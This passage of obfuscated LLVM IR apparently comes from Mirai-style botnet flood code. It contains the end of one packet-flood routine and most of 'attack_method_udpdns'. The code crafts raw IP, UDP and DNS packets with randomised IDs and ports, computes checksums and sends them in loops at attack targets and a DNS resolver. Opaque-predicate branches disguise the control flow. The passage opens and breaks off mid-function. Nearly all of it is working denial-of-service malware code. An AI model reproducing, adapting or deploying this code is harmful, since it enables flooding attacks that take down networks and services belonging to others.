  %287 = call i32 @htonl(i32 %286) #7
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 9
  store i32 %287, i32* %289, align 4
  br label %290

; <label>:290:                                    ; preds = %269, %originalBBpart216
  %291 = load i16, i16* %13, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %299

; <label>:294:                                    ; preds = %290
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 4
  br label %299

; <label>:299:                                    ; preds = %294, %290
  %300 = load i32, i32* @x.35
  %301 = load i32, i32* @y.36
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %299
  %308 = load i16, i16* %16, align 2
  %309 = zext i16 %308 to i32
  %310 = icmp eq i32 %309, 65535
  %311 = load i32, i32* @x.35
  %312 = load i32, i32* @y.36
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %310, label %319, label %324

; <label>:319:                                    ; preds = %originalBBpart220
  %320 = call i32 @rand_next()
  %321 = trunc i32 %320 to i16
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

; <label>:324:                                    ; preds = %319, %originalBBpart220
  %325 = load i32, i32* @x.35
  %326 = load i32, i32* @y.36
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %324
  %333 = load i16, i16* %17, align 2
  %334 = zext i16 %333 to i32
  %335 = icmp eq i32 %334, 65535
  %336 = load i32, i32* @x.35
  %337 = load i32, i32* @y.36
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %335, label %344, label %349

; <label>:344:                                    ; preds = %originalBBpart224
  %345 = call i32 @rand_next()
  %346 = trunc i32 %345 to i16
  %347 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 1
  store i16 %346, i16* %348, align 2
  br label %349

; <label>:349:                                    ; preds = %344, %originalBBpart224
  %350 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 7
  store i16 0, i16* %351, align 2
  %352 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %353 = bitcast %struct.iphdr* %352 to i16*
  %354 = call zeroext i16 @checksum_generic(i16* %353, i32 20)
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 7
  store i16 %354, i16* %356, align 2
  %357 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 3
  store i16 0, i16* %358, align 2
  %359 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %360 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %361 = bitcast %struct.udphdr* %360 to i8*
  %362 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 2
  %364 = load i16, i16* %363, align 2
  %365 = load i32, i32* %19, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 12, %366
  %368 = trunc i64 %367 to i32
  %369 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %359, i8* %361, i16 zeroext %364, i32 %368)
  %370 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 3
  store i16 %369, i16* %371, align 2
  %372 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 1
  %374 = load i16, i16* %373, align 2
  %375 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i32 0, i32 0
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %379, i32 0, i32 1
  store i16 %374, i16* %380, align 2
  %381 = load i32, i32* %10, align 4
  %382 = load i8*, i8** %23, align 8
  %383 = load i32, i32* %19, align 4
  %384 = sext i32 %383 to i64
  %385 = add i64 32, %384
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 0
  %392 = bitcast %struct.sockaddr_in* %391 to %struct.sockaddr*
  store %struct.sockaddr* %392, %struct.sockaddr** %386, align 8
  %393 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %394 = load %struct.sockaddr*, %struct.sockaddr** %393, align 8
  %395 = call i64 @sendto(i32 %381, i8* %382, i64 %385, i32 16384, %struct.sockaddr* %394, i32 16)
  br label %396

; <label>:396:                                    ; preds = %349
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %397, 1
  store i32 %398, i32* %9, align 4
  br label %229

; <label>:399:                                    ; preds = %229
  br label %212

; <label>:400:                                    ; preds = %96, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  store i32 1, i32* %9, align 4
  %401 = load i32, i32* %10, align 4
  %402 = bitcast i32* %9 to i8*
  %403 = call i32 @setsockopt(i32 %401, i32 0, i32 3, i8* %402, i32 4) #6
  %404 = icmp eq i32 %403, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %195
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %212
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %234
  %405 = load i8**, i8*** %11, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds i8*, i8** %405, i64 %407
  %409 = load i8*, i8** %408, align 8
  store i8* %409, i8** %23, align 8
  %410 = load i8*, i8** %23, align 8
  %411 = bitcast i8* %410 to %struct.iphdr*
  store %struct.iphdr* %411, %struct.iphdr** %24, align 8
  %412 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i64 1
  %414 = bitcast %struct.iphdr* %413 to %struct.udphdr*
  store %struct.udphdr* %414, %struct.udphdr** %25, align 8
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 2
  %420 = load i8, i8* %419, align 4
  %421 = zext i8 %420 to i32
  %422 = icmp slt i32 %421, 32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %299
  %423 = load i16, i16* %16, align 2
  %424 = zext i16 %423 to i32
  %425 = icmp eq i32 %424, 65535
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %324
  %426 = load i16, i16* %17, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp eq i32 %427, 65535
  br label %originalBB22
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %556

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %556

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %556

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %originalBBpart282, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %356

; <label>:101:                                    ; preds = %96
  %102 = load i32, i32* @x.37
  %103 = load i32, i32* @y.38
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %101
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %110 = call noalias i8* @calloc(i64 600, i64 1) #6
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %26, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %27, align 8
  %124 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %125 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %124, i64 1
  %126 = bitcast %struct.udphdr* %125 to %struct.dnshdr*
  store %struct.dnshdr* %126, %struct.dnshdr** %28, align 8
  %127 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %128 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %127, i64 1
  %129 = bitcast %struct.dnshdr* %128 to i8*
  store i8* %129, i8** %29, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %12, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i8, i8* %19, align 1
  %144 = zext i8 %143 to i64
  %145 = add i64 41, %144
  %146 = add i64 %145, 2
  %147 = load i32, i32* %21, align 4
  %148 = sext i32 %147 to i64
  %149 = add i64 %146, %148
  %150 = add i64 %149, 4
  %151 = trunc i64 %150 to i16
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %13, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %14, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %15, align 1
  %163 = icmp ne i8 %162, 0
  %164 = load i32, i32* @x.37
  %165 = load i32, i32* @y.38
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %163, label %172, label %176

; <label>:172:                                    ; preds = %originalBBpart2
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %originalBBpart2
  %177 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 17, i8* %178, align 1
  %179 = load i32, i32* @LOCAL_ADDR, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load i32, i32* %22, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 9
  store i32 %182, i32* %184, align 4
  %185 = load i16, i16* %16, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %17, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %192 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %191, i32 0, i32 1
  store i16 %190, i16* %192, align 2
  %193 = load i8, i8* %19, align 1
  %194 = zext i8 %193 to i64
  %195 = add i64 21, %194
  %196 = add i64 %195, 2
  %197 = load i32, i32* %21, align 4
  %198 = sext i32 %197 to i64
  %199 = add i64 %196, %198
  %200 = add i64 %199, 4
  %201 = trunc i64 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 2
  %205 = load i16, i16* %18, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %208 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %207, i32 0, i32 0
  store i16 %206, i16* %208, align 2
  %209 = call zeroext i16 @htons(i16 zeroext 256) #7
  %210 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %211 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = call zeroext i16 @htons(i16 zeroext 1) #7
  %213 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %214 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %213, i32 0, i32 2
  store i16 %212, i16* %214, align 2
  %215 = load i8, i8* %19, align 1
  %216 = load i8*, i8** %29, align 8
  %217 = getelementptr inbounds i8, i8* %216, i32 1
  store i8* %217, i8** %29, align 8
  store i8 %215, i8* %216, align 1
  %218 = load i8, i8* %19, align 1
  %219 = zext i8 %218 to i32
  %220 = load i8*, i8** %29, align 8
  %221 = sext i32 %219 to i64
  %222 = getelementptr inbounds i8, i8* %220, i64 %221
  store i8* %222, i8** %29, align 8
  %223 = load i8*, i8** %29, align 8
  store i8* %223, i8** %30, align 8
  %224 = load i8*, i8** %29, align 8
  %225 = getelementptr inbounds i8, i8* %224, i64 1
  %226 = load i8*, i8** %20, align 8
  %227 = load i32, i32* %21, align 4
  %228 = add nsw i32 %227, 1
  call void @util_memcpy(i8* %225, i8* %226, i32 %228)
  store i32 0, i32* %23, align 4
  br label %229

; <label>:229:                                    ; preds = %originalBBpart264, %176
  %230 = load i32, i32* @x.37
  %231 = load i32, i32* @y.38
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %229
  %238 = load i32, i32* %23, align 4
  %239 = load i32, i32* %21, align 4
  %240 = icmp slt i32 %238, %239
  %241 = load i32, i32* @x.37
  %242 = load i32, i32* @y.38
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %240, label %249, label %306

; <label>:249:                                    ; preds = %originalBBpart253
  %250 = load i32, i32* @x.37
  %251 = load i32, i32* @y.38
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %249
  %258 = load i8*, i8** %20, align 8
  %259 = load i32, i32* %23, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8, i8* %258, i64 %260
  %262 = load i8, i8* %261, align 1
  %263 = sext i8 %262 to i32
  %264 = icmp eq i32 %263, 46
  %265 = load i32, i32* @x.37
  %266 = load i32, i32* @y.38
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %264, label %273, label %283

; <label>:273:                                    ; preds = %originalBBpart257
  %274 = load i8, i8* %24, align 1
  %275 = load i8*, i8** %30, align 8
  store i8 %274, i8* %275, align 1
  store i8 0, i8* %24, align 1
  %276 = load i8, i8* %25, align 1
  %277 = add i8 %276, 1
  store i8 %277, i8* %25, align 1
  %278 = load i8*, i8** %29, align 8
  %279 = load i32, i32* %23, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds i8, i8* %278, i64 %280
  %282 = getelementptr inbounds i8, i8* %281, i64 1
  store i8* %282, i8** %30, align 8
  br label %286

; <label>:283:                                    ; preds = %originalBBpart257
  %284 = load i8, i8* %24, align 1
  %285 = add i8 %284, 1
  store i8 %285, i8* %24, align 1
  br label %286

; <label>:286:                                    ; preds = %283, %273
  br label %287

; <label>:287:                                    ; preds = %286
  %288 = load i32, i32* @x.37
  %289 = load i32, i32* @y.38
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %287
  %296 = load i32, i32* %23, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %23, align 4
  %298 = load i32, i32* @x.37
  %299 = load i32, i32* @y.38
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart264, label %originalBB59alteredBB

originalBBpart264:                                ; preds = %originalBB59
  br label %229

; <label>:306:                                    ; preds = %originalBBpart253
  %307 = load i32, i32* @x.37
  %308 = load i32, i32* @y.38
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %306
  %315 = load i8, i8* %24, align 1
  %316 = load i8*, i8** %30, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %29, align 8
  %318 = load i32, i32* %21, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %31, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  %329 = load i32, i32* @x.37
  %330 = load i32, i32* @y.38
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %337

; <label>:337:                                    ; preds = %originalBBpart268
  %338 = load i32, i32* @x.37
  %339 = load i32, i32* @y.38
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %337
  %346 = load i32, i32* %9, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %9, align 4
  %348 = load i32, i32* @x.37
  %349 = load i32, i32* @y.38
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart282, label %originalBB70alteredBB

originalBBpart282:                                ; preds = %originalBB70
  br label %96

; <label>:356:                                    ; preds = %96
  br label %357

; <label>:357:                                    ; preds = %555, %356
  store i32 0, i32* %9, align 4
  br label %358

; <label>:358:                                    ; preds = %552, %357
  %359 = load i32, i32* %9, align 4
  %360 = load i8, i8* %5, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp slt i32 %359, %361
  br i1 %362, label %363, label %555

; <label>:363:                                    ; preds = %358
  %364 = load i32, i32* @x.37
  %365 = load i32, i32* @y.38
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %363
  %372 = load i8**, i8*** %11, align 8
  %373 = load i32, i32* %9, align 4
  %374 = sext i32 %373 to i64
